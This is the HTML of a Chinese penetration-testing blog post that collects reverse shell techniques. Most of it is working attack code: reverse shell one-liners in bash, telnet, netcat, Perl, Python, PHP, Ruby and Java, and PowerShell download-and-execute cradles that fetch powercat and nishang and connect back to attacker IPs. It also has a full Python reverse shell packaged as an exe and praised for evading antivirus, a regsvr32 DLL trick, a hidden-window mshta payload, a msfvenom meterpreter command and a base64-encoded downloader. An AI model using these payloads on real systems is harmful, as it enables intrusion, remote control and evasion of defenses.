@@ -1,0 +1,862 @@
+<!DOCTYPE html>
+
+
+
+
+
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 3.9.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.4.1">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/32x32.png?v=7.4.1">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/16x16.png?v=7.4.1">
+  <link rel="mask-icon" href="/images/logo.svg?v=7.4.1" color="#222">
+  <link rel="alternate" href="/atom.xml" title="C0cho's blog" type="application/atom+xml">
+
+<link rel="stylesheet" href="/css/main.css?v=7.4.1">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.4.1',
+    exturl: false,
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    copycode: {"enable":true,"show_result":true,"style":null},
+    back2top: {"enable":true,"sidebar":true,"scrollpercent":true},
+    bookmark: {"enable":false,"color":"#222","save":"auto"},
+    fancybox: false,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      appID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    path: 'search.xml',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: '复制',
+      copy_success: '复制成功',
+      copy_failure: '复制失败'
+    },
+    sidebarPadding: 40
+  };
+</script>
+
+  <meta name="description" content="本文为反弹shell的脚本收集，使用nc作为监听。nc安装：1234567891011121314151617181、下载安装wget https://sourceforge.net/projects/netcat/files/netcat/0.7.1/netcat-0.7.1.tar.gz/downloadtar -zxvf netcat-0.7.1.tar.gz -C /usr/localcd">
+<meta name="keywords" content="反弹shell">
+<meta property="og:type" content="article">
+<meta property="og:title" content="反弹shell脚本收集">
+<meta property="og:url" content="https://choge.top/2020/02/23/反弹shell脚本收集/index.html">
+<meta property="og:site_name" content="C0cho&#39;s blog">
+<meta property="og:description" content="本文为反弹shell的脚本收集，使用nc作为监听。nc安装：1234567891011121314151617181、下载安装wget https://sourceforge.net/projects/netcat/files/netcat/0.7.1/netcat-0.7.1.tar.gz/downloadtar -zxvf netcat-0.7.1.tar.gz -C /usr/localcd">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://choge.top/2020/02/23/反弹shell脚本收集/ft-1.png">
+<meta property="og:image" content="https://choge.top/2020/02/23/反弹shell脚本收集/ft-2.png">
+<meta property="og:image" content="https://choge.top/2020/02/23/反弹shell脚本收集/ft-3.png">
+<meta property="og:image" content="https://choge.top/2020/02/23/反弹shell脚本收集/ft-4.png">
+<meta property="og:image" content="https://choge.top/2020/02/23/反弹shell脚本收集/ft-5.png">
+<meta property="og:image" content="https://choge.top/2020/02/23/反弹shell脚本收集/ft-6.png">
+<meta property="og:updated_time" content="2020-08-25T08:50:10.133Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="反弹shell脚本收集">
+<meta name="twitter:description" content="本文为反弹shell的脚本收集，使用nc作为监听。nc安装：1234567891011121314151617181、下载安装wget https://sourceforge.net/projects/netcat/files/netcat/0.7.1/netcat-0.7.1.tar.gz/downloadtar -zxvf netcat-0.7.1.tar.gz -C /usr/localcd">
+<meta name="twitter:image" content="https://choge.top/2020/02/23/反弹shell脚本收集/ft-1.png">
+  <link rel="canonical" href="https://choge.top/2020/02/23/反弹shell脚本收集/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true,
+    isPage: false,
+    isArchive: false
+  };
+</script>
+
+  <title>反弹shell脚本收集 | C0cho's blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">C0cho's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+        <p class="site-subtitle">less is more</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+      
+      
+        
+        
+        <li class="menu-item menu-item-home">
+      
+    
+      
+      
+        
+      
+        
+      
+        
+      
+    
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+      
+    
+      
+      
+        
+        
+        <li class="menu-item menu-item-about">
+      
+    
+      
+      
+        
+      
+        
+      
+        
+      
+    
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>关于</a>
+
+  </li>
+      
+    
+      
+      
+        
+        
+        <li class="menu-item menu-item-tags">
+      
+    
+      
+      
+        
+      
+        
+      
+        
+          
+        
+      
+    
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签<span class="badge">44</span></a>
+
+  </li>
+      
+    
+      
+      
+        
+        
+        <li class="menu-item menu-item-categories">
+      
+    
+      
+      
+        
+      
+        
+          
+        
+      
+        
+      
+    
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类<span class="badge">8</span></a>
+
+  </li>
+      
+    
+      
+      
+        
+        
+        <li class="menu-item menu-item-archives">
+      
+    
+      
+      
+        
+          
+        
+      
+        
+      
+        
+      
+    
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档<span class="badge">76</span></a>
+
+  </li>
+      
+    
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger">
+          <i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+    
+  </ul>
+
+</nav>
+  <div class="site-search">
+    <div class="popup search-popup">
+    <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocorrect="off" autocapitalize="none"
+           placeholder="搜索..." spellcheck="false"
+           type="text" id="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result"></div>
+
+</div>
+<div class="search-pop-overlay"></div>
+
+  </div>
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+            
+
+          <div id="content" class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://choge.top/2020/02/23/反弹shell脚本收集/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="C0cho">
+      <meta itemprop="description" content="记录生活的点点滴滴">
+      <meta itemprop="image" content="/images/author.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="C0cho's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+            反弹shell脚本收集
+            
+
+          
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              
+                
+              
+
+              <time title="创建时间：2020-02-23 20:21:52" itemprop="dateCreated datePublished" datetime="2020-02-23T20:21:52+08:00">2020-02-23</time>
+            </span>
+          
+            
+
+            
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-08-25 16:50:10" itemprop="dateModified" datetime="2020-08-25T16:50:10+08:00">2020-08-25</time>
+              </span>
+            
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Penetration-test/" itemprop="url" rel="index">
+                    <span itemprop="name">Penetration test</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+          
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">本文字数：</span>
+              
+              <span>7.4k</span>
+            </span>
+          
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              
+              <span>7 分钟</span>
+            </span>
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>本文为反弹shell的脚本收集，使用nc作为监听。</p><p>nc安装：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">1、下载安装</span><br><span class="line">wget https://sourceforge.net/projects/netcat/files/netcat/0.7.1/netcat-0.7.1.tar.gz/download</span><br><span class="line">tar -zxvf netcat-0.7.1.tar.gz -C /usr/local</span><br><span class="line">cd /usr/local</span><br><span class="line">mv netcat-0.7.1 netcat</span><br><span class="line">cd /usr/local/netcat</span><br><span class="line">./configure</span><br><span class="line">make &amp;&amp; make install</span><br><span class="line">2、配置</span><br><span class="line">vim /etc/profile</span><br><span class="line">添加以下内容：</span><br><span class="line"># set  netcat path</span><br><span class="line">export NETCAT_HOME=/usr/local/netcat</span><br><span class="line">export PATH=$PATH:$NETCAT_HOME/bin</span><br><span class="line">保存，退出，并使配置生效：</span><br><span class="line">source /etc/profile</span><br><span class="line">3、测试</span><br><span class="line">nc -help成功</span><br></pre></td></tr></table></figure><a id="more"></a>
+
+
+
+<p>攻击机使用nc监听</p>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nvlp <span class="number">4444</span></span><br></pre></td></tr></table></figure>
+
+<p>-n: 不反向解析dns，即不通过ip解析域名 no dns</p>
+<p>-v: 详细信息输出 verbose</p>
+<p>-l:  监听 listen</p>
+<p>-p: 指定端口 port</p>
+<h2 id="Linux反弹shell"><a href="#Linux反弹shell" class="headerlink" title="Linux反弹shell"></a>Linux反弹shell</h2><h3 id="bash反弹"><a href="#bash反弹" class="headerlink" title="bash反弹"></a>bash反弹</h3><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">bash </span>-i &gt;&amp; /dev/tcp/攻击机<span class="built_in">ip</span>/攻击机port <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p>bash -i：交互式shell</p>
+<p> &gt;&amp; :输入输出重定向：0 stdin, 1 stdout, 2 stderr</p>
+<p>/dev/tcp/ip/port: 特殊文件</p>
+<p><em>注: /dev/tcp/ 是Linux中的一个特殊设备,打开这个文件就相当于发出了一个socket调用，建立一个socket连接，读写这个文件就相当于在这个socket连接中传输数据。同理，Linux中还存在/dev/udp/。</em></p>
+<h3 id="telnet反弹"><a href="#telnet反弹" class="headerlink" title="telnet反弹"></a>telnet反弹</h3><p>攻击机监听端口：</p>
+<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">netcat:</span> nc -nvlp <span class="number">4444</span></span><br><span class="line"><span class="symbol">netcat:</span> nc -nvlp <span class="number">5555</span></span><br></pre></td></tr></table></figure>
+
+<p>靶机telnet反弹shell</p>
+<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">telnet</span> 攻击机<span class="built_in">ip</span> <span class="number">4444</span> <span class="title">| /bin/bash |</span> telnet 攻击机<span class="built_in">ip</span> <span class="number">5555</span></span><br></pre></td></tr></table></figure>
+
+<p><em>注：bash进程的 0 ，1 ：stdin，stdout 标准输入输出描述符 都重定向到pipe，关联两个telnet进程，两个telnet进程分别与攻击机两个端口建立了socket连接</em></p>
+<h3 id="nc（netcat）反弹"><a href="#nc（netcat）反弹" class="headerlink" title="nc（netcat）反弹"></a>nc（netcat）反弹</h3><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">nc</span> -v 攻击机<span class="built_in">ip</span> <span class="number">4444</span> -e /<span class="keyword">bin/bash</span></span><br></pre></td></tr></table></figure>
+
+<p>-e: 指定nc连接成功后执行的程序**</p>
+<h3 id="perl反弹"><a href="#perl反弹" class="headerlink" title="perl反弹"></a>perl反弹</h3><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e <span class="string">'use Socket;$i="攻击机ip";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");&#125;;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="python反弹"><a href="#python反弹" class="headerlink" title="python反弹"></a>python反弹</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("攻击机ip",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="php反弹"><a href="#php反弹" class="headerlink" title="php反弹"></a>php反弹</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r <span class="string">'$sock=fsockopen("攻击机ip",4444);exec("/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Ruby反弹"><a href="#Ruby反弹" class="headerlink" title="Ruby反弹"></a>Ruby反弹</h3><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby -rsocket -e<span class="string">'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d",f,f,f)'</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Java反弹"><a href="#Java反弹" class="headerlink" title="Java反弹"></a>Java反弹</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">r = Runtime.getRuntime()</span><br><span class="line">p = r.exec([<span class="string">"/bin/bash"</span>,<span class="string">"-c"</span>,<span class="string">"exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done"</span>] as String[])</span><br><span class="line">p.waitFor()</span><br></pre></td></tr></table></figure>
+
+<h2 id="Windows反弹shell"><a href="#Windows反弹shell" class="headerlink" title="Windows反弹shell"></a>Windows反弹shell</h2><h3 id="powershell反弹cmd"><a href="#powershell反弹cmd" class="headerlink" title="powershell反弹cmd"></a>powershell反弹cmd</h3><p>powercat是netcat的powershell版本，功能免杀性都要比netcat好用的多。<br>被攻击端运行命令</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell IEX (<span class="built_in">New-Object</span> System.Net.Webclient).DownloadString(<span class="string">'https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'</span>); powercat -c <span class="number">192.168</span>.<span class="number">1.4</span> -p <span class="number">9999</span> -e cmd</span><br></pre></td></tr></table></figure>
+
+<p>攻击端用nc监听，即可反弹出cmd。</p>
+<h3 id="powershell反弹powershell"><a href="#powershell反弹powershell" class="headerlink" title="powershell反弹powershell"></a>powershell反弹powershell</h3><p>使用nishang框架，有许多反弹脚本。</p>
+<p> <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fsamratashok%2Fnishang" target="_blank" rel="noopener">https://github.com/samratashok/nishang</a><br> 详情参考<br><a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.52bug.cn%2Fhkjs%2F4585.html" target="_blank" rel="noopener">powershell反弹shell常见方式</a><br>被攻击端运行命令</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell IEX (<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">'https://raw.githubusercontent.com/samratashok/nishang/9a3c747bcf535ef82dc4c5c66aac36db47c2afde/Shells/Invoke-PowerShellTcp.ps1'</span>);Invoke-PowerShellTcp -Reverse -IPAddress <span class="number">192.168</span>.<span class="number">203.140</span> -port <span class="number">6666</span></span><br></pre></td></tr></table></figure>
+
+<p>攻击端用nc监听， 即可反弹出powershell。<br>注意某些特殊情况需要将powershell脚本进行base64编码，才能成功反弹。比如sqlserver的命令执行、php中system函数的执行</p>
+<h4 id="base64编码处理"><a href="#base64编码处理" class="headerlink" title="base64编码处理"></a>base64编码处理</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$text</span>=<span class="string">"IEX((New-Object System.Net.WebClient).DownloadString('http://192.168.203.140/a.ps1'))"</span></span><br><span class="line"><span class="variable">$Bytes</span>=[System.Text.Encoding]::Unicode.GetBytes(<span class="variable">$Text</span>);<span class="variable">$EncodedText</span> =[Convert]::ToBase64String(<span class="variable">$Bytes</span>)</span><br><span class="line"><span class="variable">$EncodedText</span> &gt; bs64.txt</span><br></pre></td></tr></table></figure>
+
+<p>将bs64.txt源码拷贝到下面命令，被攻击端运行即可。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -exec bypass -encodedcommand base64.txt</span><br></pre></td></tr></table></figure>
+
+<p>攻击端用nc监听即可。</p>
+<h3 id="python反弹cmd"><a href="#python反弹cmd" class="headerlink" title="python反弹cmd"></a>python反弹cmd</h3><p>可以用python编写反弹cmd的代码。参考大佬的代码改写而成，更简单使用一些。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> select</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ReserveConnect</span><span class="params">(addr, port)</span>:</span></span><br><span class="line">    <span class="string">'''反弹连接shell'''</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        shell = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        shell.connect((addr,port))</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> reason:</span><br><span class="line">        <span class="keyword">print</span> (<span class="string">'[-] Failed to Create Socket : %s'</span>%reason)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    rlist = [shell]</span><br><span class="line">    wlist = []</span><br><span class="line">    elist = [shell]</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        shell.send(<span class="string">"cmd:"</span>)</span><br><span class="line">        rs,ws,es = select.select(rlist,wlist,wlist)</span><br><span class="line">        <span class="keyword">for</span> sockfd <span class="keyword">in</span> rs:</span><br><span class="line">            <span class="keyword">if</span> sockfd == shell:</span><br><span class="line">                command = shell.recv(<span class="number">1024</span>)</span><br><span class="line">                <span class="keyword">if</span> command == <span class="string">'exit'</span>:</span><br><span class="line">                    shell.close()</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                result, error = subprocess.Popen(command,shell=<span class="literal">True</span>, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE).communicate()</span><br><span class="line">                shell.sendall(result.decode(<span class="string">"GB2312"</span>).encode(<span class="string">"UTF-8"</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 主函数运行</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv)&lt;<span class="number">3</span>:</span><br><span class="line">        print(<span class="string">'Usage: python reverse.py [IP] [PORT]'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        url = sys.argv[<span class="number">1</span>]</span><br><span class="line">        port = int(sys.argv[<span class="number">2</span>])</span><br><span class="line">        ReserveConnect(url,port)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    run()</span><br></pre></td></tr></table></figure>
+
+<p>考虑实战中可能没有python环境，可以先在本地上使用pyinstaller将改文件打包为exe文件，实战中直接上传exe运行即可。</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pythinstaller -Fw  <span class="built_in">reverse</span>.<span class="keyword">py</span></span><br></pre></td></tr></table></figure>
+
+<p>被攻击端运行命令</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">reverse</span><span class="selector-class">.exe</span> 192<span class="selector-class">.168</span><span class="selector-class">.203</span><span class="selector-class">.140</span> 4455</span><br></pre></td></tr></table></figure>
+
+<p>攻击端用nc监听，即可反弹cmd。实际测试bypass av效果也比较好。</p>
+<p><img src="//choge.top/2020/02/23/反弹shell脚本收集/ft-1.png" alt="ft-1"></p>
+<p>参考大佬源代码<br><a href="https://links.jianshu.com/go?to=https%3A%2F%2Fwww.cnblogs.com%2FKevinGeorge%2Fp%2F9780151.html" target="_blank" rel="noopener">Windows下的shell原理</a></p>
+<h3 id="dll反弹cmd"><a href="#dll反弹cmd" class="headerlink" title="dll反弹cmd"></a>dll反弹cmd</h3><p>来源t00ls</p>
+<p><img src="//choge.top/2020/02/23/反弹shell脚本收集/ft-2.png" alt="ft-2"></p>
+<p>将生成的dll文件上传至被攻击端。运行命令：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">regsvr32 /s /u server.dll</span><br></pre></td></tr></table></figure>
+
+<p>攻击端用nc监听，即可反弹cmd。测试bypass av效果也不错</p>
+<h3 id="mshta命令"><a href="#mshta命令" class="headerlink" title="mshta命令"></a>mshta命令</h3><p>运行命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mshta http://47.94.80.xxx/payload.hta</span><br></pre></td></tr></table></figure>
+
+<p>payload.hta 源码为</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">HTML</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Type"</span> <span class="attr">content</span>=<span class="string">"text/html; charset=utf-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">HEAD</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">"VBScript"</span>&gt;</span></span><br><span class="line">Window.ReSizeTo 0, 0</span><br><span class="line">Window.moveTo -2000,-2000</span><br><span class="line"><span class="vbscript"><span class="keyword">Set</span> objShell = <span class="built_in">CreateObject</span>(<span class="string">"Wscript.Shell"</span>)</span></span><br><span class="line"><span class="actionscript">objShell.Run <span class="string">"shellcode"</span> <span class="comment">//可以是exe、powershell</span></span></span><br><span class="line">self.close</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">demo</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">HEAD</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">HTML</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>shellcode为msf生成。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=47.94.80.xxx   LPORT=8080 -f exe &gt; test.exe</span><br></pre></td></tr></table></figure>
+
+<p>这里将木马改为powershell，且经过base64编码后的脚本</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$fileContent</span> = <span class="string">"(new-object System.Net.WebClient).DownloadFile('http://47.94.80.xxx/ps/test.exe','D:\a.exe');start-process 'D:\a.exe'"</span></span><br><span class="line"><span class="variable">$bytes</span> = [System.Text.Encoding]::Unicode.GetBytes(<span class="variable">$fileContent</span>);</span><br><span class="line"><span class="variable">$encoded</span> = [System.Convert]::ToBase64String(<span class="variable">$bytes</span>);</span><br></pre></td></tr></table></figure>
+
+<p>使用-enc再进行解码执行</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell  -enc  <span class="variable">$encoded</span></span><br></pre></td></tr></table></figure>
+
+<p>可反弹shell</p>
+<p><img src="//choge.top/2020/02/23/反弹shell脚本收集/ft-3.png" alt="ft-3"></p>
